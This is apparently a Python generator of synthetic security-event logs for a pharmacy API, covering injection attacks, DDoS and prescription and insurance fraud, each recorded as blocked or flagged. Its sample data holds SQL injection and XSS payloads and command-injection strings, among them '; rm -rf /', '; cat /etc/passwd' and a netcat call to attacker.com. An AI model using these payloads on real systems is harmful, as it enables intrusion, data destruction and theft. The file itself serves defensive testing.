import random
from datetime import datetime
from typing import Dict

class APISecurityEventGenerator:
    def __init__(self, anomaly_frequency: float = 0.1):
        self.anomaly_frequency = anomaly_frequency
        self.event_types = [
            "rate_limit_exceeded",
            "auth_failure",
            "validation_error",
            "sql_injection",
            "xss_attempt",
            "command_injection",
            "api_key_abuse",
            "unusual_access_pattern",
            "payload_size_exceeded",
            "ddos_attempt",
            "prescription_fraud_attempt",
            "dea_verification_failure",
            "controlled_substance_override",
            "insurance_claim_manipulation"
        ]
        
        self.endpoints = [
            "/api/v1/prescriptions",
            "/api/v1/prescriptions/fill",
            "/api/v1/prescriptions/refill",
            "/api/v1/controlled-substances",
            "/api/v1/inventory",
            "/api/v1/patients",
            "/api/v1/insurance/verify",
            "/api/v1/insurance/claims",
            "/api/v1/dea/verify",
            "/api/v1/pharmacists",
            "/api/v1/admin/users",
            "/api/v1/admin/config",
            "/api/v1/pos/transaction"
        ]
        
        self.ip_addresses = [
            "10.0.1.100", "10.0.1.101", "10.0.1.102",
            "192.168.1.50", "172.16.0.10"
        ]
        
        self.suspicious_ips = [
            "185.220.101.1", "45.142.212.61", "198.51.100.42",
            "203.0.113.5", "192.0.2.100", "91.213.8.235"
        ]
        
        self.sql_injection_patterns = [
            "' OR '1'='1",
            "'; DROP TABLE prescriptions--",
            "UNION SELECT * FROM patient_records",
            "1' AND 1=1--",
            "'; SELECT dea_number FROM pharmacists--",
            "admin'--"
        ]
        
        self.xss_patterns = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<iframe src='evil.com'></iframe>"
        ]
    
    def should_generate_event(self) -> bool:
        return random.random() < self.anomaly_frequency
    
    def generate_event(self) -> Dict:
        event_type = random.choice(self.event_types)
        
        if event_type == "rate_limit_exceeded":
            return self._generate_rate_limit_event()
        elif event_type == "auth_failure":
            return self._generate_auth_failure()
        elif event_type == "validation_error":
            return self._generate_validation_error()
        elif event_type == "sql_injection":
            return self._generate_sql_injection()
        elif event_type == "xss_attempt":
            return self._generate_xss_attempt()
        elif event_type == "command_injection":
            return self._generate_command_injection()
        elif event_type == "api_key_abuse":
            return self._generate_api_key_abuse()
        elif event_type == "unusual_access_pattern":
            return self._generate_unusual_access()
        elif event_type == "payload_size_exceeded":
            return self._generate_payload_size_exceeded()
        elif event_type == "ddos_attempt":
            return self._generate_ddos_attempt()
        elif event_type == "prescription_fraud_attempt":
            return self._generate_prescription_fraud()
        elif event_type == "dea_verification_failure":
            return self._generate_dea_verification_failure()
        elif event_type == "controlled_substance_override":
            return self._generate_controlled_substance_override()
        elif event_type == "insurance_claim_manipulation":
            return self._generate_insurance_claim_manipulation()
        
        return {}
    
    def _generate_rate_limit_event(self) -> Dict:
        return {
            "event_type": "rate_limit_exceeded",
            "severity": "medium",
            "endpoint": random.choice(self.endpoints),
            "source_ip": random.choice(self.ip_addresses + self.suspicious_ips),
            "requests_per_minute": random.randint(100, 1000),
            "limit": 60,
            "api_key": f"key_{random.randint(1000, 9999)}",
            "timestamp": datetime.utcnow().isoformat(),
            "action_taken": "throttled"
        }
    
    def _generate_auth_failure(self) -> Dict:
        reasons = [
            "invalid_api_key",
            "expired_token",
            "missing_credentials",
            "invalid_signature",
            "revoked_key"
        ]
        
        return {
            "event_type": "auth_failure",
            "severity": "medium",
            "endpoint": random.choice(self.endpoints),
            "source_ip": random.choice(self.suspicious_ips),
            "reason": random.choice(reasons),
            "api_key_prefix": f"key_{random.randint(1000, 9999)}",
            "user_agent": random.choice([
                "curl/7.68.0",
                "PostmanRuntime/7.29.0",
                "python-requests/2.28.0",
                "Mozilla/5.0 (compatible; bot/1.0)"
            ]),
            "timestamp": datetime.utcnow().isoformat(),
            "attempt_count": random.randint(1, 20)
        }
    
    def _generate_validation_error(self) -> Dict:
        error_types = [
            "invalid_json",
            "missing_required_field",
            "invalid_data_type",
            "value_out_of_range",
            "malformed_request"
        ]
        
        return {
            "event_type": "validation_error",
            "severity": "low",
            "endpoint": random.choice(self.endpoints),
            "source_ip": random.choice(self.ip_addresses + self.suspicious_ips),
            "error_type": random.choice(error_types),
            "field": random.choice(["patient_id", "medication_id", "quantity", "dosage"]),
            "provided_value": "INVALID_DATA",
            "timestamp": datetime.utcnow().isoformat()
        }
    
    def _generate_sql_injection(self) -> Dict:
        return {
            "event_type": "sql_injection",
            "severity": "critical",
            "endpoint": random.choice(self.endpoints),
            "source_ip": random.choice(self.suspicious_ips),
            "injection_pattern": random.choice(self.sql_injection_patterns),
            "parameter": random.choice(["patient_id", "search", "id", "filter"]),
            "blocked": True,
            "timestamp": datetime.utcnow().isoformat(),
            "waf_rule": f"SQL_INJECTION_{random.randint(1000, 9999)}"
        }
    
    def _generate_xss_attempt(self) -> Dict:
        return {
            "event_type": "xss_attempt",
            "severity": "high",
            "endpoint": random.choice(self.endpoints),
            "source_ip": random.choice(self.suspicious_ips),
            "xss_payload": random.choice(self.xss_patterns),
            "parameter": random.choice(["name", "description", "notes", "comment"]),
            "blocked": True,
            "timestamp": datetime.utcnow().isoformat(),
            "waf_rule": f"XSS_PROTECTION_{random.randint(1000, 9999)}"
        }
    
    def _generate_command_injection(self) -> Dict:
        commands = [
            "; cat /etc/passwd",
            "| whoami",
            "&& ls -la",
            "; rm -rf /",
            "| nc attacker.com 4444"
        ]
        
        return {
            "event_type": "command_injection",
            "severity": "critical",
            "endpoint": random.choice(self.endpoints),
            "source_ip": random.choice(self.suspicious_ips),
            "command_pattern": random.choice(commands),
            "parameter": "filename",
            "blocked": True,
            "timestamp": datetime.utcnow().isoformat()
        }
    
    def _generate_api_key_abuse(self) -> Dict:
        return {
            "event_type": "api_key_abuse",
            "severity": "high",
            "api_key": f"key_{random.randint(1000, 9999)}",
            "source_ips": random.sample(self.ip_addresses + self.suspicious_ips, k=random.randint(3, 6)),
            "requests_from_multiple_ips": random.randint(50, 200),
            "time_window_minutes": random.randint(5, 30),
            "timestamp": datetime.utcnow().isoformat(),
            "action_taken": "key_suspended"
        }
    
    def _generate_unusual_access(self) -> Dict:
        return {
            "event_type": "unusual_access_pattern",
            "severity": "medium",
            "source_ip": random.choice(self.suspicious_ips),
            "endpoints_accessed": random.sample(self.endpoints, k=random.randint(3, 5)),
            "requests_per_second": random.uniform(10, 50),
            "pattern": random.choice([
                "sequential_enumeration",
                "rapid_endpoint_scanning",
                "unusual_time_of_day",
                "geographic_anomaly"
            ]),
            "timestamp": datetime.utcnow().isoformat()
        }
    
    def _generate_payload_size_exceeded(self) -> Dict:
        return {
            "event_type": "payload_size_exceeded",
            "severity": "medium",
            "endpoint": random.choice(self.endpoints),
            "source_ip": random.choice(self.ip_addresses + self.suspicious_ips),
            "payload_size_bytes": random.randint(10000000, 100000000),
            "max_allowed_bytes": 5000000,
            "timestamp": datetime.utcnow().isoformat(),
            "action_taken": "request_rejected"
        }
    
    def _generate_ddos_attempt(self) -> Dict:
        return {
            "event_type": "ddos_attempt",
            "severity": "critical",
            "target_endpoint": random.choice(self.endpoints),
            "source_ips": random.sample(self.suspicious_ips * 10, k=random.randint(20, 50)),
            "requests_per_second": random.randint(1000, 10000),
            "timestamp": datetime.utcnow().isoformat(),
            "attack_type": random.choice([
                "syn_flood",
                "http_flood",
                "slowloris",
                "udp_flood"
            ]),
            "mitigation_active": random.choice([True, False])
        }
    
    def _generate_prescription_fraud(self) -> Dict:
        return {
            "event_type": "prescription_fraud_attempt",
            "severity": "critical",
            "endpoint": "/api/v1/prescriptions/fill",
            "source_ip": random.choice(self.suspicious_ips),
            "prescription_id": f"RX{random.randint(100000, 999999)}",
            "patient_id": f"PT{random.randint(10000, 99999)}",
            "medication": random.choice(["Oxycodone 30mg", "Hydrocodone 10mg", "Adderall XR 30mg"]),
            "fraud_indicators": random.sample([
                "forged_signature",
                "altered_quantity",
                "invalid_dea_number",
                "duplicate_prescription",
                "out_of_state_prescriber",
                "excessive_early_refill"
            ], k=random.randint(2, 4)),
            "prescriber_npi": f"{random.randint(1000000000, 9999999999)}",
            "timestamp": datetime.utcnow().isoformat(),
            "blocked": True,
            "reported_to_authorities": random.choice([True, False])
        }
    
    def _generate_dea_verification_failure(self) -> Dict:
        return {
            "event_type": "dea_verification_failure",
            "severity": "high",
            "endpoint": "/api/v1/dea/verify",
            "source_ip": random.choice(self.ip_addresses),
            "dea_number": f"A{random.choice(['B', 'F', 'M'])}{random.randint(1000000, 9999999)}",
            "prescriber_name": random.choice(["Dr. Smith", "Dr. Johnson", "Dr. Williams"]),
            "failure_reason": random.choice([
                "dea_number_expired",
                "dea_number_invalid",
                "dea_number_suspended",
                "prescriber_not_authorized",
                "state_license_mismatch"
            ]),
            "controlled_substance": random.choice(["Schedule II", "Schedule III", "Schedule IV"]),
            "timestamp": datetime.utcnow().isoformat(),
            "prescription_rejected": True
        }
    
    def _generate_controlled_substance_override(self) -> Dict:
        return {
            "event_type": "controlled_substance_override",
            "severity": "critical",
            "endpoint": "/api/v1/prescriptions/fill",
            "source_ip": random.choice(self.ip_addresses),
            "user": random.choice(["pharmacist_jdoe", "tech_msmith", "pharmacy_manager"]),
            "medication": random.choice(["Oxycodone 30mg", "Morphine Sulfate 15mg", "Fentanyl Patch 50mcg"]),
            "override_type": random.choice([
                "quantity_limit_override",
                "early_refill_override",
                "prior_authorization_bypass",
                "days_supply_override"
            ]),
            "original_quantity": random.randint(30, 90),
            "overridden_quantity": random.randint(120, 240),
            "justification": random.choice([None, "patient_request", "doctor_authorization", "emergency"]),
            "timestamp": datetime.utcnow().isoformat(),
            "requires_pharmacist_review": True,
            "flagged_for_audit": True
        }
    
    def _generate_insurance_claim_manipulation(self) -> Dict:
        return {
            "event_type": "insurance_claim_manipulation",
            "severity": "high",
            "endpoint": "/api/v1/insurance/claims",
            "source_ip": random.choice(self.ip_addresses),
            "claim_id": f"CLM{random.randint(1000000, 9999999)}",
            "patient_id": f"PT{random.randint(10000, 99999)}",
            "manipulation_type": random.choice([
                "billing_code_upcoding",
                "quantity_inflation",
                "duplicate_claim_submission",
                "days_supply_manipulation",
                "ingredient_cost_inflation"
            ]),
            "original_amount": round(random.uniform(50, 500), 2),
            "modified_amount": round(random.uniform(500, 2000), 2),
            "insurance_provider": random.choice(["BlueCross", "Aetna", "UnitedHealthcare", "Cigna"]),
            "timestamp": datetime.utcnow().isoformat(),
            "detected_by": "fraud_detection_system",
            "claim_rejected": True
        }
